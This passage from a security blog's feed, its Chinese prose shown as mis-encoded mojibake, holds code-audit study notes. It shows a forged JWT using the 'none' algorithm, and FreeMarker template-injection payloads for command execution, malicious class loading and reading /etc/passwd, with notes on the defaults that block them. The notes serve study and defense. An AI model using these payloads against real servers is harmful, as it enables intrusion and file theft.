å¯†çš„æ–¹å¼è¿›è¡Œç»•è¿‡ã€‚</p><p>{â€œalgâ€:â€noneâ€} ç¼–ç åä¸º eyJhbGciOiJub25lIn0=ï¼Œå°† Payload é‡Œçš„ admin å€¼ä¿®æ”¹ä¸º trueï¼Œæœ€ç»ˆæ„é€  Token å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">eyJhbGciOiJub25lIn0<span class="token operator">%</span><span class="token number">3d</span><span class="token punctuation">.</span>eyJpYXQiOjE2NDAzMTg4NTEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.cnblogs.com/ittranslator/p/14595165.html">https://www.cnblogs.com/ittranslator/p/14595165.html</a></p><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p><p>åŸæ–‡é“¾æ¥ï¼š</p><p><a href="https://www.teamssix.com/211214-175948.html">https://www.teamssix.com/211214-175948.html</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-ä»‹ç»&quot;&gt;&lt;a href=&quot;#0x00-ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;0x00 ä»‹ç»&quot;&gt;&lt;/a&gt;0x00 ä»‹ç»&lt;/h1&gt;&lt;p&gt;JSON Web Token ç¼©å†™æˆ JWTï¼Œè¢«ç”¨äºå’ŒæœåŠ¡å™¨çš„è®¤è¯åœºæ™¯ä¸­ï¼Œè¿™ä¸€ç‚¹æœ‰ç‚¹ç±»ä¼¼äº Cook</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘æ¨¡æ¿æ³¨å…¥</title>
    <link href="https://www.teamssix.com/211203-200441.html"/>
    <id>https://www.teamssix.com/211203-200441.html</id>
    <published>2021-12-03T12:04:41.000Z</published>
    <updated>2021-12-03T12:16:44.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»"><a href="#0x00-ä»‹ç»" class="headerlink" title="0x00 ä»‹ç»"></a>0x00 ä»‹ç»</h1><p>è¿™é‡Œä¸»è¦å­¦ä¹ ä¸‹ FreeMarker æ¨¡æ¿æ³¨å…¥ï¼ŒFreeMarker æ˜¯ä¸€æ¬¾æ¨¡æ¿å¼•æ“ï¼ŒFreeMarker æ¨¡æ¿æ–‡ä»¶ä¸ HTML ä¸€æ ·éƒ½æ˜¯é™æ€é¡µé¢ï¼Œå½“ç”¨æˆ·è®¿é—®é¡µé¢æ—¶ï¼ŒFreeMarker å¼•æ“ä¼šè¿›è¡Œè§£æå¹¶åŠ¨æ€æ›¿æ¢æ¨¡æ¿ä¸­çš„å†…å®¹è¿›è¡Œæ¸²æŸ“ï¼Œç„¶åå°†æ¸²æŸ“åçš„ç»“æœè¿”å›åˆ°æµè§ˆå™¨ä¸­ã€‚</p><h1 id="0x01-FreeMarker-æ¨¡æ¿"><a href="#0x01-FreeMarker-æ¨¡æ¿" class="headerlink" title="0x01 FreeMarker æ¨¡æ¿"></a>0x01 FreeMarker æ¨¡æ¿</h1><p>FreeMarker æ¨¡æ¿è¯­è¨€ï¼ˆFreeMarker Template Languageï¼ŒFTLï¼‰ç”± 4 ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«å¦‚ä¸‹ï¼š</p><ul><li><p>æ–‡æœ¬ï¼šåŒ…æ‹¬ HTML æ ‡ç­¾ä¸é™æ€æ–‡æœ¬ç­‰é™æ€å†…å®¹ï¼Œè¯¥éƒ¨åˆ†å†…å®¹ä¼šåŸæ ·è¾“å‡º</p></li><li><p>æ’å€¼ï¼šè¿™éƒ¨åˆ†çš„è¾“å‡ºä¼šè¢«æ¨¡æ¿å¼•æ“è®¡ç®—çš„å€¼æ¥æ›¿æ¢ï¼Œä½¿ç”¨ ${} è¿™ç§è¯­æ³•</p></li><li><p>æ ‡ç­¾ï¼šå’Œ HTML æ ‡ç­¾ç±»ä¼¼ï¼Œä¸ä¼šæ‰“å°åœ¨è¾“å‡ºçš„å†…å®¹ä¸­ï¼Œæ¯”å¦‚ &lt;#assign name=â€™bobâ€™&gt;</p></li><li><p>æ³¨é‡Šï¼šå’Œ HTML æ³¨é‡Šç±»ä¼¼ï¼Œç”± &lt;#â€“ å’Œ â€“&gt; è¡¨ç¤ºï¼Œæ³¨é‡Šéƒ¨åˆ†çš„å†…å®¹ä¼š FreeMarker å¿½ç•¥</p></li></ul><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ª FreeMarker æ¨¡æ¿å†…å®¹ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Welcome TeamsSix!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>ã€€<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#--</span> <span class="token attr-name">è¿™æ˜¯æ³¨é‡Š</span> <span class="token attr-name">--</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome !<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Our latest product:    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;latestProduct.url&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;latestProduct.name&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-æ¨¡æ¿æ³¨å…¥åˆ©ç”¨"><a href="#0x02-æ¨¡æ¿æ³¨å…¥åˆ©ç”¨" class="headerlink" title="0x02 æ¨¡æ¿æ³¨å…¥åˆ©ç”¨"></a>0x02 æ¨¡æ¿æ³¨å…¥åˆ©ç”¨</h1><h2 id="1ã€new-å‡½æ•°çš„åˆ©ç”¨"><a href="#1ã€new-å‡½æ•°çš„åˆ©ç”¨" class="headerlink" title="1ã€new å‡½æ•°çš„åˆ©ç”¨"></a>1ã€new å‡½æ•°çš„åˆ©ç”¨</h2><p>FreeMarker ä¸­é¢„åˆ¶äº†å¤§é‡äº†å†…å»ºå‡½æ•°ï¼Œå…¶ä¸­ new å‡½æ•°å¯ä»¥åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ª freemarker.template.TemplateModel ç±»çš„å˜é‡ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹èƒ½è¾¾åˆ°æ‰§è¡Œä»»æ„ä»£ç çš„ç›®çš„ã€‚</p><h3 id="åˆ©ç”¨æ–¹æ³•ä¸€ï¼š"><a href="#åˆ©ç”¨æ–¹æ³•ä¸€ï¼š" class="headerlink" title="åˆ©ç”¨æ–¹æ³•ä¸€ï¼š"></a>åˆ©ç”¨æ–¹æ³•ä¸€ï¼š</h3><p>freemarker.template.utility é‡Œæœ‰ä¸ª Execute ç±»ï¼Œé€šè¿‡è§‚å¯Ÿæºä»£ç é‡Œçš„ç¬¬ 30 è¡Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»ä¼šè°ƒç”¨ Runtime.getRuntime().exec å‡½æ•°æ‰§è¡Œå®ƒçš„ aExecute å˜é‡å‚æ•°å€¼ï¼Œå› æ­¤è¿™é‡Œå¯ä»¥ä½¿ç”¨ new å‡½æ•°ä¼ è¾“æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ä½œä¸º aExecute å‚æ•°å€¼ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤ã€‚</p><p>freemarker.template.utility.Execute éƒ¨åˆ†æ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">22</span> <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">List</span> arguments<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TemplateModelException</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>    <span class="token class-name">StringBuilder</span> aOutputBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">24</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">25</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span><span class="token string">"Need an argument to execute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">26</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">27</span>        <span class="token class-name">String</span> aExecute <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>arguments<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">28</span><span class="token number">29</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">30</span>            <span class="token class-name">Process</span> exec <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>aExecute<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">31</span>            <span class="token class-name">InputStream</span> execOut <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>            <span class="token class-name">Throwable</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€  payload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.Execute<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span>$&#123;value("open -a Calculator")&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001193.png"></p><h3 id="åˆ©ç”¨æ–¹æ³•äºŒï¼š"><a href="#åˆ©ç”¨æ–¹æ³•äºŒï¼š" class="headerlink" title="åˆ©ç”¨æ–¹æ³•äºŒï¼š"></a>åˆ©ç”¨æ–¹æ³•äºŒï¼š</h3><p>freemarker.template.utility é‡Œæœ‰ä¸ª ObjectConstructor ç±»ï¼Œé€šè¿‡è§‚å¯Ÿæºä»£ç é‡Œçš„ç¬¬ 25 è¡Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»ä¼šæŠŠå®ƒçš„å‚æ•°ä½œä¸ºåç§°æ„é€ ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ã€‚</p><p>å› æ­¤ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ„é€ ä¸€ä¸ªå¯æ‰§è¡Œå‘½ä»¤çš„å¯¹è±¡ï¼Œä»è€Œ RCE</p><p>freemarker.template.utility.ObjectConstructor éƒ¨åˆ†æ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">17</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ObjectConstructor</span> <span class="token keyword">implements</span> <span class="token class-name">TemplateMethodModelEx</span> <span class="token punctuation">&#123;</span><span class="token number">18</span>     <span class="token keyword">public</span> <span class="token class-name">ObjectConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">19</span>     <span class="token punctuation">&#125;</span><span class="token number">20</span> <span class="token number">21</span>     <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">List</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TemplateModelException</span> <span class="token punctuation">&#123;</span><span class="token number">22</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">23</span>             <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span><span class="token string">"This method must have at least one argument, the name of the class to instantiate."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">24</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token number">25</span>             <span class="token class-name">String</span> classname <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">26</span>             <span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token number">27</span> <span class="token number">28</span>             <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">29</span>                 cl <span class="token operator">=</span> <span class="token class-name">ClassUtil</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">30</span>             <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">31</span>                 <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span>var6<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">32</span>             <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€  Payload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.ObjectConstructor<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span>$&#123;value("java.lang.ProcessBuilder","open","-a","Calculator").start()&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001213.png"></p><h3 id="åˆ©ç”¨æ–¹æ³•ä¸‰ï¼š"><a href="#åˆ©ç”¨æ–¹æ³•ä¸‰ï¼š" class="headerlink" title="åˆ©ç”¨æ–¹æ³•ä¸‰ï¼š"></a>åˆ©ç”¨æ–¹æ³•ä¸‰ï¼š</h3><p>freemarker.template.utility é‡Œæœ‰ä¸ª JythonRuntime ç±»ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡è‡ªå®šä¹‰æ ‡ç­¾çš„æ–¹å¼æ‰§è¡Œ Python å‘½ä»¤ï¼Œä»è€Œæ„é€ è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p><p>freemarker.template.utility.JythonRuntime éƒ¨åˆ†æ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JythonRuntime</span> <span class="token keyword">extends</span> <span class="token class-name">PythonInterpreter</span>    <span class="token keyword">implements</span> <span class="token class-name">TemplateTransformModel</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Writer</span> <span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Writer</span> out<span class="token punctuation">,</span>                            <span class="token keyword">final</span> <span class="token class-name">Map</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">StringBuilder</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">Environment</span> env <span class="token operator">=</span> <span class="token class-name">Environment</span><span class="token punctuation">.</span><span class="token function">getCurrentEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> off<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>cbuf<span class="token punctuation">,</span> off<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>                <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">JythonRuntime</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">PyObject</span> prevOut <span class="token operator">=</span> systemState<span class="token punctuation">.</span>stdout<span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        <span class="token function">setOut</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"env"</span><span class="token punctuation">,</span> env<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">exec</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        buf<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                        <span class="token function">setOut</span><span class="token punctuation">(</span>prevOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€  Payload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.JythonRuntime<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>@value</span><span class="token punctuation">></span></span>import os;os.system("open -a Calculator")<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>@value</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001223.png"></p><h2 id="2ã€api-å‡½æ•°çš„åˆ©ç”¨"><a href="#2ã€api-å‡½æ•°çš„åˆ©ç”¨" class="headerlink" title="2ã€api å‡½æ•°çš„åˆ©ç”¨"></a>2ã€api å‡½æ•°çš„åˆ©ç”¨</h2><p>é™¤äº† new å‡½æ•°ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ api å‡½æ•°è°ƒç”¨ Java APIï¼Œç„¶åé€šè¿‡ getClassLoader è·å–ç±»åŠ è½½å™¨ä»è€ŒåŠ è½½æ¶æ„ç±»ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥é€šè¿‡ getResource æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>åŠ è½½æ¶æ„ç±»çš„ Payload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">classLoader</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>object?api.class.getClassLoader()</span><span class="token punctuation">></span></span>$&#123;classLoader.loadClass("Evil.class")&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»»æ„æ–‡ä»¶è¯»å–çš„ Payload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;#assign uri=object?api.class.getResource("/").toURI()>  &lt;#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">is</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>input?api.getInputStream()</span><span class="token punctuation">></span></span>  FILE:[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#list</span> <span class="token attr-name">0..999999999</span> <span class="token attr-name">as</span> <span class="token attr-name">_</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">byte</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>is.read()</span><span class="token punctuation">></span></span>      &lt;#if byte == -1>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#break</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>#if</span><span class="token punctuation">></span></span>  $&#123;byte&#125;, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>#list</span><span class="token punctuation">></span></span>]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸è¿‡ api å†…å»ºå‡½æ•°å¹¶ä¸èƒ½éšä¾¿ä½¿ç”¨ï¼Œå¿…é¡»åœ¨é…ç½®é¡¹ apiBuiltinEnabled ä¸º true æ—¶æ‰æœ‰æ•ˆï¼Œè€Œè¯¥é…ç½®åœ¨ 2.3.22 ç‰ˆæœ¬ä¹‹åé»˜è®¤ä¸º false</p><p>åŒæ—¶ FreeMarker ä¸ºäº†é˜²å¾¡é€šè¿‡å…¶ä»–æ–¹å¼è°ƒç”¨æ¶æ„æ–¹æ³•ï¼ŒFreeMarker å†…ç½®äº†ä¸€ä»½å±é™©æ–¹æ³•åå• unsafeMethods.propertiesï¼Œä¾‹å¦‚ getClassLoaderã€newInstance ç­‰å±é™©æ–¹æ³•éƒ½è¢«ç¦ç”¨äº†ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.anquanke.com/post/id/215348">https://www.anquanke.com/post/id/215348</a></p><p><a href="https://www.cnblogs.com/Eleven-Liu/p/12747908.html">https://www.cnblogs.com/Eleven-Liu/p/12747908.html</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-ä»‹ç»&quot;&gt;&lt;a href=&quot;#0x00-ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;0x00 ä»‹ç»&quot;&gt;&lt;/a&gt;0x00 ä»‹ç»&lt;/h1&gt;&lt;p&gt;è¿™é‡Œä¸»è¦å­¦ä¹ ä¸‹ FreeMarker æ¨¡æ¿æ³¨å…¥ï¼ŒFreeMarker æ˜¯ä¸€æ¬¾æ¨¡æ¿å¼•æ“ï¼ŒFreeMar</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘è¡¨è¾¾å¼æ³¨å…¥</title>
    <link href="https://www.teamssix.com/211129-180558.html"/>
    <id>https://www.teamssix.com/211129-180558.html</id>
    <published>2021-11-29T10:05:58.000Z</published>
    <updated>2021-11-29T10:23:05.294Z</updated>
    
